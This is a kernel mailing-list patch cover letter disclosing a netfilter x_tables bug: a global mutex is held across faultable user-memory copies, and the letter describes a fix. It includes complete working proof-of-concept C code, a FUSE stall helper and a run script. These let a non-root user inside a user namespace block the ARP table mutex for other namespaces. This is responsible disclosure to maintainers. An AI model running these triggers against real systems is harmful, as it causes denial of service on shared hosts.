Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D4AE23FB067
	for <netfilter-devel@vger.kernel.org>; Sun, 20 Sep 2026 11:58:44 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789905527; cv=none; b=enywNuZUHwX65LxLXhabWhhkGxFUW12+704zwx2DBHT4sX4FG/69GaV20SPenDXKr+wT2FNNJWXnb38ua90ZM4Ufvrehga5c4XoVAqxySIdkji1yYp+o2Iuc9n6CiAeGr8WPltTXpVflixmUPQbvHbwtB+biFRSBBo8xqUEWakM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789905527; c=relaxed/simple;
	bh=gNb48zuGScLvMqZ/w7dAwzIDq9jnP2FrvxIntIqdP+c=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=MPMO0fSZS3AQtYKQcrbVX5FxOyelBdih+4Uk0AE1ZhZLm7Ai9zziEwH87xvGpYRVk0CoauEhcJYlfAZjcN2egVL2kzRFpDDMsIVyUytFYYQUQ+gCFZ7wElr0VEP7DcYXdP7IEFRmEWGrDLqfull2Mqw4RGk8IwHol7zt67MsrLw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=QDeS+Zps; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="QDeS+Zps"
Received: by mail-pj2-f12.google.com with SMTP id 98e67ed59e1d1-398a147688bso2219977a91.1
        for <netfilter-devel@vger.kernel.org>; Sun, 20 Sep 2026 04:58:44 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789905524; x=1790510324; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=prTuYvzyctOVHgCM17GNyKDBMAh2RICLOObz9ueJi54=;
        b=QDeS+ZpsQDfTlvYzG5nf3P5nRTFu8gB0sKvIFZbbqEJHSmpZzDoiZcVC09ShcV/zC5
         qwkUtNy42NavJgx/WBEOnMucj8XLQGxdRIqX/uR/zeEyB0Y4XoEcHS6PhehtXw+bILlG
         6Zhjtl1oVO+UGE15BrdiVTe6h4ylimsTQ9SGpxvJ9gJMbJOQtt7rj6IPAbUMFWnOsdlR
         nAkMt6VyiAmJbZgStGDj/QuYTqXy6UttE+l4uG7vZNPCO1jkiWM+UYsT+A+wTR32ogQz
         tr/8yv2hMT4nnldRZJU31Ajnc1v1JQz0eWnwDRvDAqEyyHqA6JsmiHXMNQaCYLNSz646
         rQOQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789905524; x=1790510324;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=prTuYvzyctOVHgCM17GNyKDBMAh2RICLOObz9ueJi54=;
        b=i4DqBofVwfo71fydZt2zWlW2txbafyFKorLw3HmWX63p+Kdk1pDs8dkm2BqT7td9q2
         7fhMGvUFqXHcBNqE16r6Oy+4NrHmjFUQPGWEDcTUTTPG6X9bXg5O4O/EhXyvk7BVPtWU
         Uf4aAAZ3jd18GvQXMm0laNMHLWQiMN83XV9x9leSQQdnx7ZJPBIr62thlPecf2eqBGcW
         J569o5SBa4200GREzo8T6Fo7oiT+6ZnjRae0FtG6hRCWOW3GpvtfHpNXe4D4tQ/o2Q2e
         ffuUGmxgOt6bPvw1gTw5cRJ6RAvxQeKo/enK9HrghTUbiFnTXuOwTXAsgtsUzelVBJQi
         /2gA==
X-Gm-Message-State: AFuF++nUaAg45XgWUx8qboHfItdT/yWUm72nl6I29K30HtrGO0OFU65p
	3nYSq8bkF9/7napbY4JBRt4H1mhPwUK7Qo4WFX19JexRotviYfO+Yfpn4pOeuJBMlY5TvGy/szg
	9AAiBwwqN
X-Gm-Gg: AYBFou0GN/L7/PLR4eXC6kQa7VTmKPvZ7BMpbJjrwAAU2AR08ApmgUY61muh6ifjrx0
	RFyjuSCKCHnDH1scwDx8dS8xPwLJaOEQQ/EEGzKaRW4j3MolDtqo1Zfm7WDS0SmrJcnQPVIB6Ud
	kLP4ayhfibjaOU5pogQYCUDmSQPew+M+FEMHj/oVAz3j6KK+jGaxRQgijfj/u+gMnPdJ6qHaEaW
	4d6c1Nwiks/W8ZKI3P6VUZv/jHDK5qu7FkMoxLEYHlR04+ez1N+82K8mQggU9ERd5QP7WFZUTn3
	uJPMvA2K832f/nRii8PaPJrhCNvIJJJTKDp+v5FLsU2YUtePflmAHqMSBwwnjahbQZt7SIYfdT8
	1YIp1ah6klkt+Sf9zvGpGbmgnF/wUgk4IpGfg7BlL9172Uum2FCMoO01moGbUO/ZsXNxy3cXFFq
	dzHwA8p5PD7cugRVauFjBMW8l+FPuLu85zoiv6+9Z91rIuqF7RooUYeRRvXvsjJXmTSuK/sNKDD
	a9gjpVC+6INgwf1usoDXVDfz+YVvG+xlQlf6ihq
X-Received: by 2002:a17:90b:4a0c:b0:3a0:345a:3634 with SMTP id 98e67ed59e1d1-3a0345a4a05mr2684971a91.41.1789905523843;
        Sun, 20 Sep 2026 04:58:43 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39e6c37c8e7sm8736746a91.9.2026.09.20.04.58.39
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 20 Sep 2026 04:58:42 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: Zihan Xi <zihanx@nebusec.ai>,
	coreteam@netfilter.org,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	netdev@vger.kernel.org,
	linux-kernel@vger.kernel.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org
Subject: [PATCH nf v3 0/1] netfilter: x_tables: avoid holding mutex over faultable user copies
Date: Sun, 20 Sep 2026 11:58:21 +0000
Message-ID: <cover.1789885804.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/netfilter/arp_tables.c. The
same lock-scope pattern is present in net/ipv4/netfilter/ip_tables.c and
net/ipv6/netfilter/ip6_tables.c. The ARP FUSE path was the only runtime
trigger exercised. The IPv4 and IPv6 paths were checked by source inspection,
but were not separately exercised. A non-root user can trigger the ARP path
after creating a private user and network namespace, where the process has
CAP_NET_ADMIN, using a FUSE-backed output buffer. In the tested setup, the
normal-buffer GET_INFO check continued to succeed on both the unfixed and
fixed kernels. The change is limited to these legacy table-read paths. In
our tests, other functionality remained unaffected; the fixed run produced
no new Oops, BUG, WARNING or kernel panic in the collected dmesg tail.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The legacy IPv4, IPv6 and ARP GET_INFO and GET_ENTRIES handlers acquire
xt[AF_INET], xt[AF_INET6] or xt[NFPROTO_ARP].mutex before copying table
data to userspace. A faultable output page can sleep while that global
per-family mutex is held, blocking operations that need the same family
mutex. Our cross-network-namespace run observed a GET_INFO waiter blocked
on that mutex. The access check is ns_capable(sock_net(sk)->user_ns,
CAP_NET_ADMIN).

The tested FUSE path is reachable by a non-root user after unshare -Urn;
the FUSE mount itself is made in the initial namespace because mounting
FUSE from the nested namespace was not permitted. The standalone poc.c
userfaultfd variant is separate from this FUSE path and requires root in
this guest because vm.unprivileged_userfaultfd=0.
The FUSE path was run only for ARP. The IPv4 and IPv6 changes are based
on source inspection of the same lock scope; no separate IPv4/IPv6 runtime
test was run.

The lock scope is present in 1da177e4c3f4 ("Linux-2.6.12-rc2"), which is
the earliest available Git snapshot. That commit has no parent, so a
first introduction before Git cannot be proven. Later namespace support
changed reachability, but does not establish a later introduction of the
root-cause fact; the historical conclusion therefore remains uncertain.

The locked copy now disables page faults. GET_ENTRIES first validates
the table and requested size while holding the family mutex, then releases
it before fault_in_safe_writeable() touches the output range. It reacquires
the mutex and revalidates the table and requested size before the nofault
copy. If the nofault copy fails, the initial attempt is followed by at most
three retries; each retry faults the range outside the lock. A failed fault-in
returns -EFAULT immediately; a mapping that keeps changing returns -EFAULT
after four nofault attempts. No retry takes place while the mutex is held.
This handles the common first fault before alloc_counters()/get_counters()
runs, so it avoids a discarded counter snapshot. GET_INFO copies its
fixed-size result after unlocking, and the same fault-safe handling covers
the IPv4/IPv6 compat GET_ENTRIES paths.

The nofault GET_ENTRIES copy still runs under the family mutex; the fix
removes faultable user-page waits, not the duration of the locked copy.

ebtables GET uses the separate ebt_mutex and is outside this
IPv4/IPv6/ARP series. GET_ENTRIES can still perform kernel-side
alloc_counters()/vzalloc() and cond_resched() work under its mutex; the
patch removes the user-controlled fault wait, not every lock-held sleep.

Reproducer:

The following files must be saved with these exact names in one directory.
The commands below build all helpers and run the FUSE/user-namespace path.
Run the package-install commands as root, then run make, chmod, and poc.sh as
a non-root user with access to /dev/fuse. The user-namespace trigger binary
is named poc-userns-trig; the FUSE helper binary is fuse_stall.

    mkdir -p /tmp/xtables-poc
    cd /tmp/xtables-poc
    apt-get update
    apt-get install -y fuse3 libfuse3-dev pkg-config gcc make
    make
    chmod +x poc.sh
    ./poc.sh

The holder's GET_ENTRIES output points at the FUSE-backed page. On an
unpatched kernel it reaches folio_wait_bit_common while holding the
xtables mutex, and a GET_INFO waiter in the other network namespace
reaches xt_find_table_lock. With v3, table and size validation precede
fault-in, and an -EFAULT from the nofault copy can trigger a bounded retry
after the mutex is released, so the waiter does not remain blocked on the
mutex.

For completeness, run the standalone userfaultfd path from a root shell:

    gcc -O2 -static -o poc poc.c
    ./poc

The validation used a 2 vCPU, 2 GiB RAM x86 QEMU guest. The latest fixed
run used TCG because KVM was unavailable in the test environment.

    qemu-system-x86_64 -machine accel=tcg -smp 2 -m 2G

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter_arp/arp_tables.h>
#include <linux/userfaultfd.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef ARRAY_SIZE
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#endif

static const char *table_name = "filter";

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static int make_ipv4_sock(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET, SOCK_DGRAM)");
	return fd;
}

static unsigned int fetch_table_size(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
		die("getsockopt(ARPT_SO_GET_INFO)");
	if (len != sizeof(info)) {
		fprintf(stderr, "unexpected ARPT_SO_GET_INFO length %u\n",
			(unsigned int)len);
		exit(EXIT_FAILURE);
	}

	close(fd);
	return info.size;
}

static int setup_userfaultfd(void *addr, size_t len)
{
	struct uffdio_api api;
	struct uffdio_register reg;
	int uffd;

	uffd = syscall(SYS_userfaultfd, 0);
	if (uffd < 0)
		die("userfaultfd");

	memset(&api, 0, sizeof(api));
	api.api = UFFD_API;
	if (ioctl(uffd, UFFDIO_API, &api) < 0)
		die("UFFDIO_API");

	memset(&reg, 0, sizeof(reg));
	reg.range.start = (unsigned long)addr;
	reg.range.len = len;
	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
	if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0)
		die("UFFDIO_REGISTER");

	return uffd;
}

static void hang_in_get_entries(unsigned int table_size)
{
	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
	size_t data_len = (table_size + page_size - 1) & ~(page_size - 1);
	size_t map_len = page_size + data_len;
	char *mapping;
	struct arpt_get_entries *get;
	socklen_t len;
	int fd;
	int uffd;

	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		die("mmap");

	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
	memset(get, 0, sizeof(*get));
	strncpy(get->name, table_name, sizeof(get->name) - 1);
	get->size = table_size;

	uffd = setup_userfaultfd(mapping + page_size, data_len);
	(void)uffd;

	fd = make_ipv4_sock();
	len = sizeof(*get) + table_size;

	fprintf(stderr,
		"holder[%d]: calling ARPT_SO_GET_ENTRIES with %u-byte table and a missing output page\n",
		getpid(), table_size);
	fflush(stderr);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
		fprintf(stderr,
			"holder[%d]: GET_ENTRIES unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void block_on_xt_mutex(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	fprintf(stderr,
		"waiter[%d]: calling ARPT_SO_GET_INFO and should block on xt[NFPROTO_ARP].mutex\n",
		getpid());
	fflush(stderr);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static pid_t spawn_child(void (*fn)(unsigned int), unsigned int arg)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork");
	if (pid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		fn(arg);
		_exit(EXIT_FAILURE);
	}
	return pid;
}

static pid_t spawn_waiter_child(void)
{
	pid_t pid = fork();

	if (pid < 0)
		die("fork");
	if (pid == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		block_on_xt_mutex();
		_exit(EXIT_FAILURE);
	}
	return pid;
}

static void dump_proc_state(pid_t pid, const char *tag)
{
	char path[64];
	char buf[256];
	int fd;
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return;
	buf[n] = '\0';
	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
}

int main(void)
{
	unsigned int table_size;
	pid_t holder;
	pid_t waiter;
	unsigned int i;

	if (geteuid() != 0) {
		fprintf(stderr, "run as root for the userfaultfd-based trigger path\n");
		return EXIT_FAILURE;
	}

	table_size = fetch_table_size();
	fprintf(stderr, "parent[%d]: table \"%s\" size=%u bytes\n",
		getpid(), table_name, table_size);

	holder = spawn_child(hang_in_get_entries, table_size);
	sleep(1);
	waiter = spawn_waiter_child();

	fprintf(stderr,
		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
		getpid(), holder, waiter);
	fflush(stderr);

	for (i = 0; i < 30; i++) {
		dump_proc_state(holder, "holder");
		dump_proc_state(waiter, "waiter");
		sleep(1);
	}

	fprintf(stderr, "parent[%d]: holder/waiter still stalled; mutex hold is the bug\n", getpid());
	kill(holder, SIGKILL);
	kill(waiter, SIGKILL);
	waitpid(holder, NULL, 0);
	waitpid(waiter, NULL, 0);
	return EXIT_FAILURE;
}
------END poc.c------

------BEGIN poc_userns_trigger.c------
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/netfilter_arp/arp_tables.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef SOL_IP
#define SOL_IP 0
#endif

static const char *table_name = "filter";

static void die(const char *msg)
{
	perror(msg);
	exit(EXIT_FAILURE);
}

static int make_ipv4_sock(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket(AF_INET, SOCK_DGRAM)");
	return fd;
}

static unsigned int fetch_table_size(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int fd = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
		die("getsockopt(ARPT_SO_GET_INFO)");

	close(fd);
	return info.size;
}

static void hang_in_get_entries(unsigned int table_size, const char *path)
{
	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
	size_t map_len = page_size * 2;
	char *mapping;
	struct arpt_get_entries *get;
	int backing_fd;
	int sock;
	socklen_t len;

	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (mapping == MAP_FAILED)
		die("mmap anonymous");

	backing_fd = open(path, O_RDWR | O_CLOEXEC);
	if (backing_fd < 0)
		die("open fuse file");

	if (mmap(mapping + page_size, page_size, PROT_READ | PROT_WRITE,
		 MAP_PRIVATE | MAP_FIXED, backing_fd, 0) == MAP_FAILED)
		die("mmap fuse page");
	close(backing_fd);

	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
	memset(get, 0, sizeof(*get));
	strncpy(get->name, table_name, sizeof(get->name) - 1);
	get->size = table_size;

	sock = make_ipv4_sock();
	len = sizeof(*get) + table_size;

	fprintf(stderr,
		"holder[%d]: namespace GET_ENTRIES using FUSE-backed output page\n",
		getpid());
	fflush(stderr);

	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_ENTRIES, get, &len) == 0) {
		fprintf(stderr, "holder[%d]: GET_ENTRIES unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "holder[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void block_on_xt_mutex(void)
{
	struct arpt_getinfo info;
	socklen_t len = sizeof(info);
	int sock = make_ipv4_sock();

	memset(&info, 0, sizeof(info));
	strncpy(info.name, table_name, sizeof(info.name) - 1);

	fprintf(stderr,
		"waiter[%d]: namespace GET_INFO expected to block on xt mutex\n",
		getpid());
	fflush(stderr);

	if (getsockopt(sock, SOL_IP, ARPT_SO_GET_INFO, &info, &len) == 0) {
		fprintf(stderr, "waiter[%d]: GET_INFO unexpectedly returned\n",
			getpid());
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "waiter[%d]: unexpected errno=%d (%s)\n",
		getpid(), errno, strerror(errno));
	exit(EXIT_FAILURE);
}

static void dump_netns(pid_t pid, const char *tag)
{
	char path[64];
	char link[128];
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/ns/net", pid);
	n = readlink(path, link, sizeof(link) - 1);
	if (n <= 0)
		return;
	link[n] = '\0';
	fprintf(stderr, "%s[%d]: netns=%s\n", tag, pid, link);
}

static void dump_wchan(pid_t pid, const char *tag)
{
	char path[64];
	char buf[256];
	int fd;
	ssize_t n;

	snprintf(path, sizeof(path), "/proc/%d/wchan", pid);
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return;
	buf[n] = '\0';
	fprintf(stderr, "%s[%d]: wchan=%s\n", tag, pid, buf);
}

int main(int argc, char **argv)
{
	unsigned int table_size;
	pid_t holder;
	pid_t waiter;
	unsigned int i;

	if (argc != 2) {
		fprintf(stderr, "usage: %s <fuse-file-path>\n", argv[0]);
		return EXIT_FAILURE;
	}

	if (geteuid() != 0) {
		fprintf(stderr,
			"run under unshare -Urn so the process has namespace-local CAP_NET_ADMIN\n");
		return EXIT_FAILURE;
	}

	table_size = fetch_table_size();
	dump_netns(getpid(), "parent");
	fprintf(stderr, "parent[%d]: namespace table size=%u bytes\n",
		getpid(), table_size);

	holder = fork();
	if (holder < 0)
		die("fork");
	if (holder == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		if (unshare(CLONE_NEWNET) < 0)
			die("unshare(CLONE_NEWNET)");
		table_size = fetch_table_size();
		fprintf(stderr,
			"holder[%d]: entered a separate network namespace\n",
			getpid());
		hang_in_get_entries(table_size, argv[1]);
	}

	sleep(1);

	waiter = fork();
	if (waiter < 0)
		die("fork");
	if (waiter == 0) {
		prctl(PR_SET_PDEATHSIG, SIGKILL);
		dump_netns(getpid(), "waiter");
		block_on_xt_mutex();
	}

	fprintf(stderr,
		"parent[%d]: holder=%d waiter=%d; dumping wchan while waiter should block\n",
		getpid(), holder, waiter);
	fflush(stderr);

	for (i = 0; i < 30; i++) {
		dump_netns(holder, "holder");
		dump_netns(waiter, "waiter");
		dump_wchan(holder, "holder");
		dump_wchan(waiter, "waiter");
		sleep(1);
	}

	kill(holder, SIGKILL);
	kill(waiter, SIGKILL);
	waitpid(holder, NULL, 0);
	waitpid(waiter, NULL, 0);
	return EXIT_FAILURE;
}
------END poc_userns_trigger.c------

------BEGIN fuse_stall.c------
#define FUSE_USE_VERSION 31

#include <errno.h>
#include <fuse3/fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static const char *file_name = "stall.bin";
static const size_t file_size = 4096;

static int stall_getattr(const char *path, struct stat *st,
			 struct fuse_file_info *fi)
{
	(void)fi;
	memset(st, 0, sizeof(*st));

	if (strcmp(path, "/") == 0) {
		st->st_mode = S_IFDIR | 0755;
		st->st_nlink = 2;
		return 0;
	}

	if (strcmp(path, "/stall.bin") == 0) {
		st->st_mode = S_IFREG | 0666;
		st->st_nlink = 1;
		st->st_size = file_size;
		return 0;
	}

	return -ENOENT;
}

static int stall_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
			 off_t off, struct fuse_file_info *fi,
			 enum fuse_readdir_flags flags)
{
	(void)off;
	(void)fi;
	(void)flags;

	if (strcmp(path, "/") != 0)
		return -ENOENT;

	filler(buf, ".", NULL, 0, 0);
	filler(buf, "..", NULL, 0, 0);
	filler(buf, file_name, NULL, 0, 0);
	return 0;
}

static int stall_open(const char *path, struct fuse_file_info *fi)
{
	(void)fi;

	if (strcmp(path, "/stall.bin") != 0)
		return -ENOENT;
	return 0;
}

static int stall_read(const char *path, char *buf, size_t size, off_t off,
		      struct fuse_file_info *fi)
{
	(void)buf;
	(void)size;
	(void)off;
	(void)fi;

	if (strcmp(path, "/stall.bin") != 0)
		return -ENOENT;

	fprintf(stderr,
		"fuse[%d]: read request for stall.bin received; stalling indefinitely\n",
		getpid());
	fflush(stderr);

	for (;;)
		pause();
}

static const struct fuse_operations stall_ops = {
	.getattr = stall_getattr,
	.readdir = stall_readdir,
	.open = stall_open,
	.read = stall_read,
};

int main(int argc, char **argv)
{
	if (argc != 2) {
		fprintf(stderr, "usage: %s <mountpoint>\n", argv[0]);
		return EXIT_FAILURE;
	}

	return fuse_main(argc, argv, &stall_ops, NULL);
}
------END fuse_stall.c------

------BEGIN Makefile------
CC ?= gcc
CFLAGS ?= -O2 -Wall -Wextra
PKG_CONFIG ?= pkg-config

FUSE_AVAILABLE := $(shell $(PKG_CONFIG) --exists fuse3 && echo 1 || echo 0)
FUSE_CFLAGS := $(shell $(PKG_CONFIG) --cflags fuse3 2>/dev/null)
FUSE_LIBS := $(shell $(PKG_CONFIG) --libs fuse3 2>/dev/null)

ifeq ($(FUSE_AVAILABLE),1)
ALL_TARGETS := poc poc-userns-trig fuse_stall
else
ALL_TARGETS := poc poc-userns-trig
endif

.PHONY: all clean

all: $(ALL_TARGETS)

poc: poc.c
	$(CC) $(CFLAGS) -o $@ $<

poc-userns-trig: poc_userns_trigger.c
	$(CC) $(CFLAGS) -o $@ $<

fuse_stall: fuse_stall.c
ifeq ($(FUSE_AVAILABLE),1)
	$(CC) $(CFLAGS) $(FUSE_CFLAGS) -o $@ $< $(FUSE_LIBS)
else
	@echo "fuse3 headers not found; install libfuse3-dev in the guest to build fuse_stall" >&2
	@exit 1
endif

clean:
	rm -f poc poc-userns-trig fuse_stall
------END Makefile------

------BEGIN poc.sh------
#!/bin/sh
set -eu

mnt="${1:-$HOME/fusemnt}"
fuse_bin="${FUSE_BIN:-./fuse_stall}"
trigger_bin="${TRIGGER_BIN:-./poc-userns-trig}"
log_file="${FUSE_LOG:-$HOME/fuse_stall.log}"

fusermount3 -u -q "$mnt" 2>/dev/null || true
rm -rf "$mnt"
mkdir -p "$mnt"

"$fuse_bin" "$mnt" >"$log_file" 2>&1 &
for _ in $(seq 1 50); do
	if [ -e "$mnt/stall.bin" ]; then
		exec unshare -Urn "$trigger_bin" "$mnt/stall.bin"
	fi
	sleep 0.2
done

echo "timed out waiting for $mnt/stall.bin" >&2
exit 1
------END poc.sh------

Unpatched FUSE/user-namespace runtime observation. The holder is in a
FUSE page fault; the waiter is blocked on the xt mutex. This is a
lock-contention observation, not a crash log.

The helper build completed with fuse_build_rc=0, and fuse_stall plus
poc-userns-trig built successfully. The recorded fixed run kept the holder
at folio_wait_bit_common while the GET_INFO waiter stayed at wchan=0 and
returned success (getsockopt() == 0). An ordinary GET_INFO check reported
name=filter, size=952, entries=4, and the collected dmesg tail had no Oops,
BUG, WARNING or kernel panic. These observations are from the ARP run only.

The following logs are real cross-network-namespace observations. The
unpatched block records the lock contention; the v3 fixed block shows
the holder waiting on FUSE while the GET_INFO waiter returns success.
In this helper, "GET_INFO unexpectedly returned" is the success branch:
getsockopt() returned 0, and the waiter was no longer blocked (wchan=0). The
harness exits with POC_RC=1 after its 30-second observation loop
deliberately kills both children; this is expected harness behavior,
not a kernel failure. The FUSE run does not set hung_task_panic or a
hung-task timeout; it uses the holder and waiter wchan values as its oracle.

----BEGIN lock-contention observation----
parent[540]: netns=net:[4026532177]
parent[540]: namespace table size=952 bytes
holder[550]: entered a separate network namespace
holder[550]: namespace GET_ENTRIES using FUSE-backed output page
parent[540]: holder=550 waiter=551; dumping wchan while waiter should block
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: netns=net:[4026532177]
waiter[551]: wchan=0
waiter[551]: namespace GET_INFO expected to block on xt mutex
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: wchan=xt_find_table_lock
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: wchan=xt_find_table_lock
holder[550]: netns=net:[4026532247]
waiter[551]: netns=net:[4026532177]
holder[550]: wchan=folio_wait_bit_common
waiter[551]: wchan=xt_find_table_lock
-----END lock-contention observation-----

----BEGIN fixed v3 observation----
parent[9799]: netns=net:[4026532713]
parent[9799]: namespace table size=952 bytes
holder[9832]: entered a separate network namespace
parent[9799]: holder=9832 waiter=9855; dumping wchan while waiter should block
holder[9832]: netns=net:[4026532868]
waiter[9855]: netns=net:[4026532713]
waiter[9855]: namespace GET_INFO expected to block on xt mutex
waiter[9855]: GET_INFO unexpectedly returned
holder[9832]: wchan=folio_wait_bit_common
waiter[9855]: wchan=0
holder[9832]: netns=net:[4026532868]
holder[9832]: wchan=folio_wait_bit_common
waiter[9855]: wchan=0
POC_RC=1
-----END fixed v3 observation-----

----BEGIN crash log----
NOT RUN: this v3 validation produced no kernel crash or stack trace. The
FUSE run uses the lock-contention observations above instead; it does not
enable hung_task_panic or a hung-task timeout.
-----END crash log-----

Best regards,
Zihan Xi

changes in v3:
  - Validate table and requested size before fault-in, then revalidate the
    table and size after lock reacquisition in native and IPv4/IPv6 compat
    GET_ENTRIES paths.
  - Make retry semantics explicit: one initial nofault attempt followed by
    at most three retries. Keep fault-in and retry decisions outside family
    mutexes; failed fault-in and exhausted retries return -EFAULT.
